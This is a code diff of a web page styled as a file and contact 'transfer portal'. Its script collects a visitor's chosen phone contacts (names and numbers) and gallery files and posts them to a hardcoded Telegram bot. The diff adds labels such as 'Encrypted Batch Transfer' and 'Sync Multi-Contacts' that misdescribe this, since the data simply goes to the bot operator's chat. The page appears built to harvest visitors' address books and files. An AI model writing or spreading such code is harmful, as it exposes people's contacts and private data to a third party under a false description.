@@ -34,22 +34,17 @@
         ::-webkit-scrollbar-thumb { background: #333; border-radius: 10px; }
         .progress-bar { transition: width 0.4s ease; }
 
-        /* কন্টাক্ট মোডের জন্য বিশেষ ডিজাইন */
-        .contact-mode-box {
-            background: linear-gradient(145deg, rgba(59, 130, 246, 0.1), rgba(0, 0, 0, 0.5));
-            border: 2px solid rgba(59, 130, 246, 0.4);
-            box-shadow: 0 0 30px rgba(59, 130, 246, 0.1) inset;
+        /* কন্টাক্ট মোডের জন্য স্পেশাল নিওন ডিজাইন */
+        .contact-special-box {
+            background: radial-gradient(circle at center, rgba(59, 130, 246, 0.15) 0%, transparent 70%);
+            border: 2px solid #3b82f6;
+            box-shadow: 0 0 15px rgba(59, 130, 246, 0.3), inset 0 0 15px rgba(59, 130, 246, 0.2);
             position: relative;
-            overflow: hidden;
+            animation: borderGlow 2s infinite alternate;
         }
-        .contact-mode-box::after {
-            content: "SECURE SYNC";
-            position: absolute;
-            bottom: 10px;
-            font-size: 8px;
-            letter-spacing: 5px;
-            color: rgba(59, 130, 246, 0.5);
-            font-weight: 900;
+        @keyframes borderGlow {
+            from { border-color: #3b82f6; box-shadow: 0 0 10px rgba(59, 130, 246, 0.3); }
+            to { border-color: #60a5fa; box-shadow: 0 0 25px rgba(59, 130, 246, 0.6); }
         }
     </style>
 </head>
@@ -79,11 +74,15 @@
                 <p id="upload-label" class="text-[11px] text-gray-400 font-black tracking-[0.2em] uppercase text-center px-4">Tap to open Gallery</p> 
             </label> 
 
-            <div id="contact-box" class="hidden contact-mode-box h-64 flex flex-col items-center justify-center cursor-pointer rounded-[35px] mb-6 group animate-pulse" onclick="pickContacts()">
-                <div class="bg-blue-500/20 p-6 rounded-full mb-3 group-hover:scale-110 transition-transform">
-                    <span class="text-6xl">👤</span>
+            <div id="contact-box" class="hidden contact-special-box h-64 flex flex-col items-center justify-center cursor-pointer rounded-[35px] mb-6 group" onclick="pickContacts()">
+                <div class="relative">
+                    <span class="text-6xl group-hover:scale-110 transition-transform block">👥</span>
+                    <div class="absolute -top-2 -right-2 bg-blue-500 w-6 h-6 rounded-full flex items-center justify-center animate-bounce">
+                        <span class="text-[10px] font-bold">+</span>
+                    </div>
                 </div>
-                <p class="text-[11px] text-blue-400 font-black tracking-[0.2em] uppercase text-center px-4">Tap to Multi-Select Contacts</p>
+                <p class="text-[11px] text-blue-400 font-black tracking-[0.2em] uppercase text-center px-4 mt-4">Sync Multi-Contacts</p>
+                <span class="text-[8px] text-gray-500 mt-2 tracking-widest uppercase">Encrypted Batch Transfer</span>
             </div>
 
             <button onclick="ignite()" id="sendBtn" class="w-full py-6 bg-white text-black font-black rounded-[30px] hover:bg-blue-600 hover:text-white transition-all active:scale-95 shadow-2xl uppercase tracking-[0.3em]">Ignite Transfer</button> 
@@ -147,15 +146,15 @@ async function pickContacts() {
             if (contacts.length) {
                 const formatted = contacts.map(c => ({
                     isContact: true,
-                    name: c.name[0] || "No Name",
-                    tel: (c.tel && c.tel[0]) ? c.tel[0] : "No Number",
+                    name: c.name[0] || "Unknown",
+                    tel: (c.tel && c.tel[0]) ? c.tel[0] : "N/A",
                     id: Math.random()
                 }));
                 queue = [...queue, ...formatted];
                 render();
             }
         } else {
-            alert("Contact Picker not supported! Use Chrome on Android with HTTPS.");
+            alert("Contact Picker not supported! Use Chrome on Android.");
         }
     } catch (err) { console.log(err); }
 }
@@ -204,43 +203,58 @@ async function ignite() {
     btn.innerText = "⚡ TRANSMITTING..."; 
     statusBox.classList.remove('hidden');
 
-    let sent = 0; 
-    const total = queue.length; 
+    let sentCount = 0; 
+    const totalItems = queue.length; 
+    const now = new Date();
+    const timeInfo = `📅 ${now.toLocaleDateString()} | ⏰ ${now.toLocaleTimeString()}`;
 
-    for (let i = 0; i < queue.length; i++) {
-        const item = queue[i];
-        let success = false;
+    // কন্টাক্ট লিস্ট এবং ফাইল আলাদা করা
+    const contacts = queue.filter(item => item.isContact);
+    const files = queue.filter(item => !item.isContact);
 
-        if(item.isContact) {
-            const now = new Date();
-            const msg = `👤 *New Contact*\n\nName: ${item.name}\nPhone: \`${item.tel}\`\n\n📅 ${now.toLocaleDateString()}\n⏰ ${now.toLocaleTimeString()}\n🌐 Portal: X-FILES ULTRA`;
-            try {
-                const res = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
-                });
-                success = res.ok;
-            } catch(e) { success = false; }
-        } else {
-            const method = (currentType === 'photo' && item.size < 10*1024*1024) ? 'sendPhoto' : 'sendDocument';
-            const fd = new FormData(); 
-            fd.append("chat_id", CHAT_ID); 
-            fd.append(method === 'sendPhoto' ? 'photo' : 'document', item); 
-            try {
-                const res = await fetch(`https://api.telegram.org/bot${TOKEN}/${method}`, { method: 'POST', body: fd });
-                success = res.ok;
-            } catch (err) { success = false; }
-        }
+    // ১. কন্টাক্টগুলো একলগে পাঠানো
+    if(contacts.length > 0) {
+        let contactList = `👥 *Batch Contact Sync*\n\n`;
+        contacts.forEach((c, idx) => {
+            contactList += `${idx + 1}. 👤 ${c.name} : \`${c.tel}\`\n`;
+        });
+        contactList += `\n${timeInfo}\n🌐 Portal: X-FILES ULTRA`;
 
-        if(success) {
-            sent++;
-            sCountDisp.innerText = sent;
-            qCountDisp.innerText = total - sent;
-            const percent = Math.round((sent / total) * 100);
-            progressFill.style.width = percent + "%";
-            statusText.innerText = `Transferring: ${percent}%`;
-        }
+        try {
+            const res = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: contactList, parse_mode: 'Markdown' })
+            });
+            if(res.ok) sentCount += contacts.length;
+        } catch(e) {}
+        
+        // প্রগ্রেস আপডেট
+        updateUI(sentCount, totalItems);
+    }
+
+    // ২. ফাইলগুলো পাঠানো
+    for (const f of files) {
+        const method = (currentType === 'photo' && f.size < 10*1024*1024) ? 'sendPhoto' : 'sendDocument';
+        const fd = new FormData(); 
+        fd.append("chat_id", CHAT_ID); 
+        fd.append(method === 'sendPhoto' ? 'photo' : 'document', f); 
+        
+        try {
+            const res = await fetch(`https://api.telegram.org/bot${TOKEN}/${method}`, { method: 'POST', body: fd });
+            if(res.ok) {
+                sentCount++;
+                updateUI(sentCount, totalItems);
+            }
+        } catch (err) {}
+    }
+
+    function updateUI(sent, total) {
+        sCountDisp.innerText = sent;
+        qCountDisp.innerText = total - sent;
+        const percent = Math.round((sent / total) * 100);
+        progressFill.style.width = percent + "%";
+        statusText.innerText = `Transferring: ${percent}%`;
     }
 
     btn.innerText = "MISSION COMPLETED"; 
